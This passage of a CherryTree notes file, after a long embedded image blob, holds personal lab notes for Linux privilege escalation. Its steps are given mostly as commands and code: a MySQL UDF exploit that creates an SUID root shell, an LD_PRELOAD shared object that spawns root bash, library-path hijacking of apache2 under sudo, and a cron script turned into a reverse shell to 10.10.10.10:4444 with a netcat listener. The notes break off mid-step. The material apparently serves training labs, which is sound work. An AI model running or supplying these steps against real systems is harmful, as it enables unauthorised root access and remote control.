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</encoded_png>
      <node name="mysql_service_as_root" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655871902" ts_lastsave="1658221995">
        <rich_text>             The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a </rich_text>
        <rich_text link="webs https://www.exploit-db.com/exploits/1518">popular exploit</rich_text>
        <rich_text> that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
Change into the /home/user/tools/mysql-udf directory:
</rich_text>
        <rich_text family="monospace">cd /home/user/tools/mysql-udf</rich_text>
        <rich_text>
Compile the raptor_udf2.c exploit code using the following commands:
</rich_text>
        <rich_text family="monospace">gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
</rich_text>
        <rich_text>
gcc -g -shared -Wl,-soname,raptor.so -o raptor.so raptor.o -lc

Connect to the MySQL service as the root user with a blank password:
</rich_text>
        <rich_text family="monospace">mysql -u root</rich_text>
        <rich_text>

Execute  the following commands on the MySQL shell to create a User Defined  Function (UDF) "do_system" using our compiled exploit:
</rich_text>
        <rich_text family="monospace" foreground="#00ff00">use mysql;</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text family="monospace" foreground="#00ff00">create table foo(line blob);</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text family="monospace" foreground="#00ff00">insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text family="monospace" foreground="#00ff00">select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text family="monospace" foreground="#00ff00">create function do_system returns integer soname 'raptor_udf2.so';</rich_text>
        <rich_text>

</rich_text>
        <rich_text family="monospace" foreground="#00ff00">use mysql;</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text family="monospace" foreground="#00ff00">create table foo(line blob);</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text family="monospace" foreground="#00ff00">insert into foo values(load_file('/tmp/raptor.so'));</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text family="monospace" foreground="#00ff00">select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor.so';</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text family="monospace" foreground="#00ff00">create function do_system returns integer soname 'raptor.so';</rich_text>
        <rich_text>

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
</rich_text>
        <rich_text family="monospace">select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');</rich_text>
        <rich_text>
Exit out of the MySQL shell (type </rich_text>
        <rich_text weight="heavy">exit</rich_text>
        <rich_text> or </rich_text>
        <rich_text weight="heavy">\q</rich_text>
        <rich_text> and press </rich_text>
        <rich_text weight="heavy">Enter</rich_text>
        <rich_text>) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
</rich_text>
        <rich_text family="monospace">/tmp/rootbash -p</rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">Remember  to remove the /tmp/rootbash executable and exit out of the root shell  before continuing as you will create this file again later in the room!</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace">rm /tmp/rootbash
exit</rich_text>
      </node>
      <node name="shared_library" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655875094" ts_lastsave="1655875094">
        <rich_text>Sudo can be configured to inherit certain environment variables from the user's environment.
Check which environment variables are inherited (look for the env_keep options):
</rich_text>
        <rich_text family="monospace">sudo -l</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
</rich_text>
        <rich_text>
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD  loads a shared object before any others when a program is run.  LD_LIBRARY_PATH provides a list of directories where shared libraries  are searched for first.
Create a shared object using the code located at /home/user/tools/sudo/preload.c:
</rich_text>
        <rich_text family="monospace">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</rich_text>
        <rich_text>

preload.c
cat /home/user/tools/sudo/preload.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

Run one of the programs you are allowed to run via sudo (listed when running </rich_text>
        <rich_text weight="heavy">sudo -l</rich_text>
        <rich_text>), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
</rich_text>
        <rich_text family="monospace">sudo LD_PRELOAD=/tmp/preload.so program-name-here</rich_text>
        <rich_text>

A  root shell should spawn. Exit out of the shell before continuing.  Depending on the program you chose, you may need to exit out of this as  well.
Run ldd against the apache2 program file to see which shared libraries are used by the program:
</rich_text>
        <rich_text family="monospace">ldd /usr/sbin/apache2</rich_text>
        <rich_text>

Create  a shared object with the same name as one of the listed libraries  (libcrypt.so.1) using the code located at  /home/user/tools/sudo/library_path.c:
</rich_text>
        <rich_text family="monospace">gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</rich_text>
        <rich_text>

Run  apache2 using sudo, while settings the LD_LIBRARY_PATH environment  variable to /tmp (where we output the compiled shared object):
</rich_text>
        <rich_text family="monospace">sudo LD_LIBRARY_PATH=/tmp apache2</rich_text>
        <rich_text>

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1  to the name of another library used by apache2 and re-run apache2 using  sudo again. Did it work? If not, try to figure out why not, and how  the library_path.c code could be changed to make it work.</rich_text>
      </node>
      <node name="library_directory" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655875719" ts_lastsave="1655875720">
        <rich_text>then change crontab shell/binary to run what we want

check shared library directory
</rich_text>
        <rich_text family="monospace">ldd /usr/sbin/apache2</rich_text>
        <rich_text> / ldd &lt;binary_path&gt;

        linux-vdso.so.1 =&gt;  (0x00007fff217ff000)
        libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f7befb59000)
        libaprutil-1.so.0 =&gt; /usr/lib/libaprutil-1.so.0 (0x00007f7bef935000)
        libapr-1.so.0 =&gt; /usr/lib/libapr-1.so.0 (0x00007f7bef6fb000)
        libpthread.so.0 =&gt; /lib/libpthread.so.0 (0x00007f7bef4df000)
        libc.so.6 =&gt; /lib/libc.so.6 (0x00007f7bef173000)
        libuuid.so.1 =&gt; /lib/libuuid.so.1 (0x00007f7beef6e000)
        librt.so.1 =&gt; /lib/librt.so.1 (0x00007f7beed66000)
        libcrypt.so.1 =&gt; /lib/libcrypt.so.1 (0x00007f7beeb2f000) &lt; we can overwrite this library to spawn shell
        libdl.so.2 =&gt; /lib/libdl.so.2 (0x00007f7bee92a000)
        libexpat.so.1 =&gt; /usr/lib/libexpat.so.1 (0x00007f7bee702000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f7bf0016000)

gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
</rich_text>
      </node>
      <node name="crontab_rewrite" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655875375" ts_lastsave="1655876612">
        <rich_text># /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh


script_rewrite

#!/bin/bash
bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1

</rich_text>
        <rich_text family="monospace">nc -nvlp 4444</rich_text>
      </node>
      <node name="PATH_environment_variable" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655875693" ts_lastsave="1655876610">
        <rich_text family="monospace">cat /etc/crontab</rich_text>
        <rich_text>

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh


Note that the PATH variable starts with </rich_text>
        <rich_text weight="heavy">/home/user</rich_text>
        <rich_text> which is our user's home directory.
Create a file called </rich_text>
        <rich_text weight="heavy">overwrite.sh</rich_text>
        <rich_text> in your home directory with the following contents:
